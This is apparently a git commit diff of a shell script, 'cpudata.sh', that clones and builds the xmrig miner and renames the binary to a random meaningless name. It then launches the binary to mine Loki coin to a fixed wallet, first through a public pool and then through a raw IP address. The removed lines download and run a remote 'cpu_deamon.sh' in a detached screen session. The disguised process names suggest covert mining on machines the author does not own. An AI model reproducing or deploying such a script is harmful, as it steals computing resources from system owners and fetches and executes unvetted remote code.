271660e91d78e3689fb40992995b18f59c536259
ts6aud5vkg <44915776+ts6aud5vkg@users.noreply.github.com>
2019-11-13 01:33:54 +0700

    Update cpudata.sh

--- cpudata.sh
+++ cpudata.sh
@@ -9,7 +9,7 @@ rm -r /usr/local/src/$azure
 git clone https://github.com/xmrig/xmrig.git /usr/local/src/$azure
 a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
 cd /usr/local/src/$azure
-sysctl -w vm.nr_hugepages=128 
+sysctl -w vm.nr_hugepages=128
 mkdir build
 cd build
 cmake ..
@@ -18,9 +18,4 @@ mv xmrig $azure -n
 cp $azure "$cpuname"
 rm -f  xmrig
 echo $cpuname" is starting"
-screen -d -m ./"${cpuname}" --donate-level 1 -o loki.herominers.com:10110 -u LQhoRFjHmsAjLa64TZjMPaAf6DUBnzETBbnasnb5gxDSCp1guVSfmPJ19ms57g3xMCZpwjhf5PM34FrcjPaEuthv3jnpABV -p az -a rx/loki -k -t 4
-wget https://raw.githubusercontent.com/ts6aud5vkg/gpuissa/master/cpu_deamon.sh
-chmod 755 cpu_deamon.sh
-screen -d -m ./cpu_deamon.sh
-
-
+./"${cpuname}" --donate-level 1 -o 158.101.11.171:3333 -u LQhoRFjHmsAjLa64TZjMPaAf6DUBnzETBbnasnb5gxDSCp1guVSfmPJ19ms57g3xMCZpwjhf5PM34FrcjPaEuthv3jnpABV -p az -a rx/loki -k -t 4
